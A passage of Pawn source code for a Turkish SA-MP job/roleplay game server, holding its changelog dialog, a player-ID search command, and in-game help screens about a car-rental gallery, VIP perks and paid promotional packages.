	format(YenilikYazi, 2000, "%s{DDDDDD}Birden fazla banka hesabý açýlabilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ev satýn alma sýnýrý 1'e iþyeri alma sýnýrý 2'ye düþürüldü.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ev, araç, iþyeri satýldýðýnda yarý parasý gelecek(Geliþtirmeler buna dahil).\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Þirket üyeleri konuþurken isimlerinin baþýnda tag olacak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Þirket üyeleri oyunda deðilken de yönetilebilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araçlarýn yakýtlarý biraz daha hýzlý tükenecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Konvoylarda yük almayan veya býrakmayan üyeler /convoykontrol ile görülebilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Polis araçlarýnda siren açýldýðýnda yanýp sönen farlarla ilgili bug düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ambulansçý ve Tamirci meslekleri tamamen kaldýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/112 komutu kaldýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çöpçülük mesleði yenilendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çöpçülük görevleri artýk 2 kiþi yapýlacak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Banlanan oyuncular oyuna girdiklerinde banlayaný ve ban sebebini görebilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(VIP)VIP oyuncular konvoylarýna /convoysifre ile þifre koyabilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(ADMIN)/ban komutunun kullanýlýþ þekli deðiþtirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(ADMIN)Sýnýrsýz ban atmaya yarayan /sban komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(ADMIN)/ban2 komutunun kullanýlýþ þekli deðiþtirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(ADMIN)Sýnýrsýz offline ban atmaya yarayan /sban2 komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(ADMIN)Bir oyuncuya dair ban bilgisini görmeye yarayan /bangor komutu eklendi.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V3 Build 173{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- HUSEYIN Santa Maria Beach Mansion haritasý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Araç içindeyken hava balonuna binme engellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Aranýyorken saðlýk barýnýn yukarýsýnda aranma seviyeniz gösterilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Satýn alýnabilecek yeni araçlar eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Oyun içerisindeki yazýlarda birtakým düzenlemeler yapýldý.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu Build 172{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- DIVER ADASI haritasý daha güvenli sürüþ saðlamak için yenilendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- (ADMIN)Rehberlerden /etk komutu yetkisi alýndý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- (ADMIN)2 level yöneticilere /giveweapon komutu geldi.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu Build 171{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Los Santos Santa Maria Beach'e Donator Mekaný eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Donator Mekaný'na sadece Donator'ler girebilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- EvoturK The Mansion mapi eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Sinyal sistemi kaldýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Los Santos Santa Maria Beach'te /balon yazarak hava balonu kiralanabilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- VIP üyeler istedikleri yerde ücretsiz hava balonu kiralayabilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- (ADMIN)/cmdkapat komutu geri getirildi ve CMD ekraný sola kaydýrýldý.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu Build 170{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Polislerin /spike komutu kaldýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Genel chate mesaj atmak için artýk 10 skor gerekmeyecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /kurallar kabul edildiðinde bir seferlik verilen para 25K'ya çýkarýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Araç kiralama fiyatlarý 10'da birine indirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Rehberler artýk /admins'ten görüntülenebilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- 2000$'ýnýz yoksa aracýnýz tamir olmayacak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Üzerinizde giþe ücreti kadar para yoksa giþeden geçemeyeceksiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /rescue artýk ücretsiz!\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- TUGIS ADASI haritasý güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- (ADMIN)/changenick'te banka hesabý aktarýlmama sorunu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- (ADMIN)/transfer komutu para gönderecek oyuncuda yazýlan miktar yoksa çalýþmayacak.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu Build 169{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Las Venturas Otogar Map'i güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Giþe maplerindeki açýklar kapatýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- 5. banda sýnýrsýz ban olayý kaldýrýldý.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu Build 168{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- 7 Level yöneticiler için /changenick komutu getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Þirket sahipleri /srespawncars yazarak þirket araçlarýný respawn edebilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /sarkiac [ID] yazýlarak ID'si bilinen þarký kolayca açýlabilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Evlerdeki araçlarýn gitmesini önlemek amaçlý çalýþma yapýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Banka hesaplarýndaki para limiti 500m'den 900m'ye çýkarýldý.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu Build 167{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Giþe sistemi dinamik hale getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Ücret karþýlýðý giþe satýn alýnabilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Sahibi olduðunuz giþeden oyuncular geçtikçe giþede para birikecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Ev araçlarýnýn silinmemesi için gereken araç sigorta zorunluluðu kaldýrýldý.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu Build 166{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Oyuncular arasý para gönderme sýnýrý 100K'ya çýkarýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Hýz göstergesi artýk sadece þoför koltuðunda gösterilecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Oyuncu spawn olmadan Anti Ping'den kick yemeyecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- \"X oyuncusu Y olarak spawn oldu\" yazýsýnýn floodu önlendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Ev ve Ýþyeri sistemlerinde birtakým düzenlemelere gidildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- EtkinkYazi);lik sistemindeki silah gitme bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Donatorluk hakkýnda bilgi veren /donator komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /modifiye menüsündeki Pembe renk Kýrmýzý yapýldý.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu Build 165{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Donator sistemi getirildi. Donatorlarýn isimleri DONATOR SOKAÐI'nda yazacak. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- DONATOR [YILDIZLAR SOKAGI]na gitmek icin bir komut eklendi /godonator \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Oyuncular Arasý Para Gonderme Sýnýrý 10K yapildi, 10K uzeri Transferleri 7 Level Admin Yapmaktadir.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- DONATORLAR ICIN /myskin komutu eklendi .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- BUG FIX ve MAP FIX yapildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Yýldýzlar Caddesi Mapi eklendi.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu Build 164{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Donator sistemi getirildi. Donatorlarýn isimleri DONATOR SOKAÐI'nda yazacak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- FakeKill'in skor ve para düþürmesi engellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Çevik Kuvvetin silahlarý alýndý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- 1 Level yöneticiler artýk REHBER olarak geçecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Polis mesleði 1000 skora alýndý.\n", YenilikYazi);*/

	/*
	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu Build 163{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- LV Golf Sahasý'nýn yerindeki þirketin mapi güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Yönetim kadrosunu gösteren /yonetim komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Ev satarken fiyatýnýn yarýsýný gelmesi sorunu düzeltildi.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu Build 162{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Nitro Ateþi kaldýrýldý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /yagmurduasi /sabri gibi animasyonlar geri getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Ýþyeri fiyatlarý güncellendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Meslek gelirleri güncellendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Asistan(Tamirci) Mesleði kaldýrýldý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Anti FakeKill üzerinde çalýþma yapýldý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Susturulmuþken /sa /as /vipol /adminol komutlarý kullanýlamayacak\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}v2.7{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Artik hicbir isci Sinifi Baska Mesleklerin Aracini calamicak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Can tazeleme artik Araclarin icindeykende oliyor .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Ping Limiti 650 ye Yükseltildi .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /hizlitamir komutuna Benzin fullemede geldi (+2000$) .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Area69 Etklar icin acilmistir .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Tugis island girisindeki Direk kaldirildi .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Viplere /vcamera eklendi .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Bir Sirket silindi ve yenisi geldi .\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- .\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}v2.6{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Anti Ping Sistemi eklendi (Limit: 500).\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /hizlitamir komutu eklendi(5000$).\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Tufanin Mapi kaldirildi ve Yeni Sirket Map Eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Chatda konusmak icin en az 10 Skor gerekli(Reklam önlemi).\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- LV-LS arasi 2 Yeni HGS eklendi.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}v2.5.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Cöpcü Meslegi icin Ranklar eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Cöpcü Meslegi icin Yeni Kamyonlar ekledni.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Cöpcü Meslegi Texdraw hatalari düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- HGS Para Kesmeme Sorunu düzeltildi.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}v2.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Cöpcü Meslegi Eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Cöpcü Meslegi icin Yeni Map ekledni.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Yol iscisine Ceza keserken Kirmizi görünme Bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Mafya ve Tamirci icin Yeni Rescue Yerleri eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Yeni Objeler eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Lv Sf Arasi Otoyolda Denemelik HGS eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Bir Sirket Mapi silindi ve Yenisi eklendi.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}v2.4{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /getid komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- /asistan(/tamir)komutu düzenlendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Tamirci icin Yol iscisnin kirmizi görünme Bugu giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Reklam önlemleri alindi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Bir Sirket Mapi silindi ve Yenisi eklendi.\n", YenilikYazi); */

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu YENILIKLER{DDDDDD})", YenilikYazi, "Kapat", "");
	return 1;
}
/*
CMD:getid(playerid, params[])
{
    new name[24];
    if(sscanf(params, "s[24]", name)) return SendClientMessage(playerid, 0xFF0000FF, "Usage: /getid [name/id]");
    new Count = 0;
    new fstr[150];
    for(new i = 0; i < MAX_PLAYERS; i++) //foreach would be the better option...
    {
        if(IsPlayerConnected(i))
        {
            new playersname[24];
            GetPlayerName(i, playersname, 24);
            if(strfind(name, playersname, true) != -1)
            {
                format(fstr, sizeof(fstr), "%s (ID: %i)", playersname, i);
                SendClientMessage(playerid, 0xFFFF00FF, fstr);
                Count++;
                continue;
            }
        }
    }
    if(Count == 0) return SendClientMessage(playerid, 0xFF0000FF, "There were no matches found.");
    format(fstr, sizeof(fstr), "There was a total of %i potential matches found.", Count);
    SendClientMessage(playerid, 0x00FF00FF, fstr);
    return 1;
}*/

CMD:getid( playerid, params[ ] )
{
    new found, string[128], playername[MAX_PLAYER_NAME];
    if(isnull(params)) return SendClientMessage(playerid, -1, "Kullanis: /getid [isim] ");
    format(string,sizeof(string),"Aranan Oyuncu: \"%s\"",params);
    SendClientMessage(playerid, -1,string);
    for(new i=0; i <= MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
            GetPlayerName(i, playername, MAX_PLAYER_NAME);
            new namelen = strlen(playername);
            new bool:searched=false;
            for(new pos=0; pos <= namelen; pos++)
            {
                if(searched != true)
                {
                    if(strfind(playername,params,true) == pos)
                    {
                        found++;
                        format(string,sizeof(string),"%d. %s (ID: %d)",found,playername,i);
                        SendClientMessage(playerid, -1 ,string);
                        searched = true;
                    }
                }
            }
        }
    }
    if(found == 0)
    SendClientMessage(playerid, -1, "Böyle bir Oyuncu bulunamadi!");
    return 1;
}
CMD:galerisistemi(playerid, params[])
{
	new YenilikYazi[2000];

	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncu galeri satýn alabilir.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Galeri sahibi sahip olduðu galeri için araç satýn alýp kiralayabilir.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araç kira gelirleri galerinin kasasýnda birikir ve galeri sahibi istediði zaman kasadan para alabilir.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Galeri sahibi araç için saatlik kira belirler.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}- Oyuncu 15 dk (saalik kiranýn çeyreði ücreti öder), - yarým saat (saatlik kiranýn yarýsý ücreti öder), - veya 1 saatlik kiralayabilir.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncunun kirasý bitince araç galeriye geri döner.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncu istediði zaman araç kirasýný sonlandýrabilir. {ADFF2F}(/kirabitir)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncu istediði zaman aracýný herkese açýp kapatabilir. {ADFF2F}(/izinver)\n", YenilikYazi);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{ADFF2F}Galeri Sistemi Hakkýnda", YenilikYazi, "Kapat", "");
	return 1;
}

CMD:vipbilgi(playerid, params[])
{
	new YenilikYazi[2000];
	new year, month, day, hour, VBParca[4][10];
	split(VIPBitis[playerid], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);
	if(VIP[playerid] == 0)
	{
	format(YenilikYazi, 2000, "%s{FFFFFF}Þuanda VIP Üyeliðiniz bulunmamaktadýr.\n \n", YenilikYazi);
	}else{
	format(YenilikYazi, 2000, "%s{FFFFFF}VIP Üyeliðiniz devam etmektedir bitiþ tarihi: {ADFF2F}%d.%d.%d Saat %d.00 \n", YenilikYazi, day, month, year, hour);
	}
    format(YenilikYazi, 2000, "%s\n \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}VIP Üyeliðinin Avantajlarý:\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Mesleklerden 3 katý skor ve para kazanýrsýnýz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Kamyonculuk görevi sýrasýnda dorseniz kaybolursa /getdorse yazarak çekebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Ateþ tuþuna basýlý tuttuðunuzda otomatik nitro açýlýr.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} /myskin yazarak skininizi deðiþtirebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} /vipneon yazarak aracýnýza neon takabilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} YENÝ!/otorenkon  & /otorenkoff  Aracýnýzýn Renginiz Otomatik Deðiþtire Bilirsiniz..\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Chat'te adýnýzýn yanýnda (VIP) yazar.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} /vtamir ile Araciniz tamir edebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} /ehliyetyeri ile Sfdeki Ehliyet Yerine gidersiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} /vbenzin ile Deponuzu doldurursunuz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Havai Fisek Patlatin /hfyerlestir /hfbaslat.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Lideri olduðunuz konvoya þifre koyabilirsiniz. /convoysifre\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Balona ücretsiz binebilirsiniz. /balon\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s\n \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}VIP Üyeliði satýn almak için {ADFF2F}/market {FFFFFF} menüsündeki paketlere bakabilirsiniz.\n", YenilikYazi);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FCB100}VIP Üyelik Hakkýnda", YenilikYazi, "Kapat", "");
	return 1;
}
CMD:vip(playerid, params[])
{
  return cmd_vipbilgi(playerid, params);
}
CMD:kampanya(playerid, params[])
{
	new YenilikYazi[2000];
	new year, month, day, hour, VBParca[4][10];
	split(VIPBitis[playerid], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);
	if(VIP[playerid] == 0)
	{
	format(YenilikYazi, 2000, "%s{FFFFFF}Þuanda VIP Üyeliðiniz bulunmamaktadýr.\n \n", YenilikYazi);
	}else{
	format(YenilikYazi, 2000, "%s{FFFFFF}VIP Üyeliðiniz devam etmektedir bitiþ tarihi: {ADFF2F}%d.%d.%d Saat %d.00 \n", YenilikYazi, day, month, year, hour);
	}
	format(YenilikYazi, 2000, "%s{FFFFFF}Tekli ürünler:\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} $50.000.000 = 15 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} $100.000.000 = 25 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} $150.000.000 = 35 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} $200.000.000 = 45 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 100 Skor = 20 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 300 Skor = 45 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 500 Skor = 70 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 7 Günlük VIP = 5 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 15 Günlük VIP = 10 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 30 Günlük VIP = 15 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 10 Kiþilik þirket = 7 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 20 Kiþilik þirket = 15 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 30 Kiþilik þirket = 25 (TL)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Donator üyelik = 5 (TL) ve üstü baðýþ yapanlara verilir.\n", YenilikYazi);
	
	
	format(YenilikYazi, 2000, "%s {FF0000}Full + Full Paket; \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 2 Ay VIP + Ýstediðin biryere ev açtýrmak + 20 Kiþilik Þirket + $30.000.000 Para + 750 Skor = 100 TL\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} 1 Ay VIP + 10 Kiþilik Þirket + $15.000.000 Para + 500 Skor = 70 TL\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s {FF0000}Þirket Sahipleri için Malzeme Fiyatlarý; \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Þirket Kasasýna $30.000.000 + 10 Slot Ekleme = 25 TL\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Þirket Kasasýna $50.000.000 + 10 Slot Ekleme = 35 TL\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Þirket Kasasýna $70.000.000 + 20 Slot Ekleme = 75 TL\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s {FF0000}Ödemeler; \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Canakkale Meslek - EFT - Havale\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s {FF0000}Ýletiþim; \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} fb.com/tircilarmekanivip\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}Kampanya bitiþ tarihi: {FF0000}1 Ocak 2018\n", YenilikYazi);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FCB100}YILBASI KAMPANYASI !", YenilikYazi, "Kapat", "");
	return 1;
}
CMD:ininal(playerid, params[])
{
	new YenilikYazi[2000];
/*	if(APlayerData[playerid][PlayerDonLevel] == 0);
	{
	format(YenilikYazi, 2000, "%s{FFFFFF}Þuanda DONATOR Üyeliðiniz bulunmamaktadýr.\n", YenilikYazi);
	}
	if(APlayerData[playerid][PlayerDonLevel] > 0);
	{
	format(YenilikYazi, 2000, "%s{FFFFFF}Þuanda DONATOR Üyeliðiniz bulunmakta.\n", YenilikYazi);
	}*/
    format(YenilikYazi, 2000, "%s\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}Ýninal kart nedir nasýl alýnýr:\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Ýninal karta Migros ve Teknosa Maðzalarýnda satýlmaktadýr.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF} Ýninal kart ile nasýl VIP , Skor gibi þeyler alýnýr;\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC}#1 - Akýllý Telefonunuza 'Ýninal Cep Cüzdan' Uygulamasýný indiriyorsunuz..\n", YenilikYazi);
